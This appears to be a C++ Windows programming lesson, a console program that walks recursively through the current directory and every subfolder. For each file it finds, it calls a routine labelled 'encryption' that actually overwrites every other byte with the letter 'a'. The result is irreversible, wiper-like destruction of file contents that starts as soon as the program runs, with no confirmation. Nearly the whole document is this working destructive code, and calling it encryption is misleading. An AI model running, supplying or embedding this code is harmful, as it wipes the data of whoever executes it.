

/*
www.小空格.com

*/




// 文件遍历并加密.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <windows.h>

//3 加密
void jiami(char* fileName){
	//1 打开文件
	FILE* fp = NULL;
	fp = fopen(fileName, "r+b");//以二进制读写方式打开文件
	if (NULL == fp){
		printf("打开文件失败!\n");
		return;
	}
	//2 获取文件大小(字节数)
	int len = 0;
	//2.1 设置文件内容指针到文件末尾
	 //  文件 距离  文件尾
	fseek(fp, 0, SEEK_END);
	//2.2 数文件内容指针到文件头有多少字节（文件大小）
	len = ftell(fp);
	//2.3 设置文件内容指针到文件头
	fseek(fp, 0, SEEK_SET);
	//3 隔一个字符插入一个加密字符
	char code = 'a';
	for (int i = 0; i < len; i++){
		fwrite(&code, 1, 1, fp);//写入一个字符到文件内容指针处
		fseek(fp, 1, SEEK_CUR);
	}
	//4 关闭文件
	fclose(fp);
}
//2 遍历这个文件夹以及下面的所有文件：逐个查看某文件夹下所有文件
void travel(char* pathName){
	//文件和文件夹都是文件
	//1 找文件夹里面的第一个文件
	//1.1 先确定要找的文件的名字
	WIN32_FIND_DATA findData;
	char fileName[MAX_PATH] = { 0 };
	sprintf(fileName, "%s\\*.*", pathName);
	HANDLE hFile = FindFirstFile(fileName, &findData);
	if (hFile == INVALID_HANDLE_VALUE){
		printf("没有找到文件!\n");
		return;
	}
	
	//2 判断
	char temp[MAX_PATH];
	int ret = 1;
	while (ret){
		if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){//2.2 文件夹
			//travel（pathName//文件夹名）
			//遍历子文件夹
			if (findData.cFileName[0] != '.'){//避开所有隐藏文件夹
				//准备好了文件夹的名字
				memset(temp, 0, MAX_PATH);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("文件夹：%s\n", temp);
				//Sleep(500);
				travel(temp);
			}
		}
		else{//文件
			//找下一个
			memset(temp, 0, MAX_PATH);
			sprintf(temp, "%s\\%s", pathName, findData.cFileName);
			printf("文件：%s\n", temp);
			//加密
			jiami(temp);
		}
		ret = FindNextFile(hFile, &findData);
	}	
}

int _tmain(int argc, _TCHAR* argv[])
{
	//1 要加密哪个文件夹？找出它的名字。     
	//buffer : 缓冲区  保存数据的区域
	char currentDirectory[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, currentDirectory);

	printf("当前所在文件夹:%s\n", currentDirectory);
	travel(currentDirectory);
#if 0
	char fileName[MAX_PATH] = { 0 };
	sprintf(fileName, "%s\\1.txt", currentDirectory);
	jiami(fileName);
#endif

	while (1);
	return 0;
}

